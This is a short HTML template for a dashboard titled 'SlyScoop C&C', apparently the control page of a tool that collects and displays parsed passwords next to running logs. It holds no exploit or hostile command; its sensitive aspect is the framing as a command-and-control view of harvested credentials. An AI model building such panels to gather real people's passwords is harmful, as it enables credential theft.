<link rel="stylesheet" type="text/css" href="static/passwords.css" />

<h1>SlyScoop C&C</h1>

<div id="left">
    <h2>Parsed Passwords</h2>
    % include('password_template.tpl', passwords=passwords)
</div>

<div id="right">
    <h2>Running Logs</h2>
    {{logs}}
</div>
<div class="clear"></div>